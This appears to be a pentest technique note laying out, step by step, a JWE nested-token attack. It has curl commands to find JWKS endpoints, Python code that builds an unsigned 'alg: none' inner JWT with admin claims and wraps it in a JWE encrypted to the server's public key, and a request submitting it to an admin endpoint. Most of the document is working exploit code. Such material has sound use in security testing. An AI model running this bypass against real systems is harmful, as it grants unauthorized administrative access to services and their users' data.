# JWE Nested Token Attack (PlainJWT inside JWE)

## When this applies

- Token has 5 dot-separated Base64URL parts (JWE format) instead of 3 (JWS/JWT).
- JWKS endpoint exposes an RSA public key with `"use": "enc"` or RSA-OAEP / RSA-OAEP-256 key-management algorithms.
- The server decrypts the outer JWE layer but does NOT verify the inner JWT signature.

## Technique

JWE format: `HEADER.ENCRYPTED_KEY.IV.CIPHERTEXT.AUTH_TAG`. The encrypted payload is itself a JWT (header.payload.signature). Vulnerable servers verify only the outer encryption (which an attacker can produce using the server's PUBLIC encryption key) and trust the inner JWT contents without checking its signature.

By crafting an unsigned inner JWT (`alg: none`) and wrapping it in a valid JWE envelope encrypted to the server's public key, you bypass authentication.

## Steps

### 1. Identify JWE token format

Token has 5 dot-separated Base64URL parts:

```
eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJlbmMiOiJBMTI4R0NNIn0.<encKey>.<iv>.<ciphertext>.<tag>
```

If only 3 parts, it's a regular JWT — different attack class.

### 2. Discover JWKS endpoint

Standard paths:
```bash
curl https://target/.well-known/jwks.json
curl https://target/.well-known/openid-configuration | jq .jwks_uri
```

Non-standard paths (when standard fail):
```bash
curl https://target/api/auth/jwks
curl https://target/oauth/jwks
curl https://target/auth/jwks.json
curl https://target/keys
curl https://target/certs
```

### 3. Locate the encryption key

Look for a key with `"use": "enc"` or with `"alg": "RSA-OAEP"` / `"RSA-OAEP-256"`. If `use` is missing, try every key with key-management algs.

### 4. Build unsigned inner JWT

```python
import base64, json

inner_header = {"alg": "none", "typ": "JWT"}
inner_claims = {"sub": "admin", "role": "admin", "exp": 9999999999}

h = base64.urlsafe_b64encode(json.dumps(inner_header).encode()).decode().rstrip('=')
p = base64.urlsafe_b64encode(json.dumps(inner_claims).encode()).decode().rstrip('=')
plain_jwt = f"{h}.{p}."             # trailing dot, no signature
```

### 5. Wrap in JWE using server's public key

```python
from jwcrypto import jwk, jwe
import json, requests

# Fetch encryption key
jwks_data = requests.get('https://target/api/auth/jwks').json()
server_pub = jwk.JWK(**jwks_data['keys'][0])    # encryption key

# JWE header
jwe_header = {
    "alg": "RSA-OAEP-256",     # or RSA-OAEP, per JWKS key
    "enc": "A128GCM",           # or A256GCM, per server preference
    "typ": "JWT",
    "cty": "JWT"                 # signals nested JWT
}

# Encrypt
jwe_token = jwe.JWE(
    plain_jwt.encode(),
    recipient=server_pub,
    protected=json.dumps(jwe_header)
)

print(jwe_token.serialize(compact=True))
```

### 6. Submit JWE token

```bash
curl -H "Authorization: Bearer $JWE_TOKEN" https://target/api/admin
```

### 7. Try alg/enc variations

If the first attempt fails, vary:

| `alg` | `enc` |
|---|---|
| RSA-OAEP-256 | A128GCM |
| RSA-OAEP-256 | A256GCM |
| RSA-OAEP | A128GCM |
| RSA-OAEP | A256GCM |
| RSA-OAEP | A128CBC-HS256 |
| RSA1_5 | A128CBC-HS256 (legacy, but still supported) |

### 8. If `cty: JWT` is rejected, try without

Some servers don't honor `cty`; the inner JWT is still parsed as JSON. Drop `cty: JWT` and see if the wrapped token is processed.

## Verifying success

- The crafted JWE returns 200 from a privileged endpoint.
- The inner `sub: admin` is honored despite no signature verification.
- A second submission with a different inner `sub` value behaves correspondingly — confirms the inner claims are what's read.

## Common pitfalls

- Most modern JWT/JWE libraries (jose, jjwt 0.10+) require explicit verify+decrypt steps; if the server only decrypts and doesn't call `verify`, the attack works.
- Server may have a separate signing key (RS256) and encryption key (RSA-OAEP). Make sure you're using the encryption key for wrapping.
- `alg` and `enc` must match what the server expects — test multiple combinations.
- `cty: JWT` signals nested JWT to compliant libraries; without it, the inner token may be treated as opaque payload and not parsed.
- Some servers reject `alg: none` even in nested context — replace with `RS256` and use a key the server trusts (combine with alg-confusion).

## Tools

- jwcrypto (Python) for JWE crafting.
- jose (Node.js).
- jose4j (Java).
- Burp Suite JWT Editor (limited JWE support — manual crafting often required).

## General principle

Systems with layered cryptographic verification (encryption + signing) often validate only the outer layer. Always test the inner layer independently — decryption success does NOT imply signature validation.
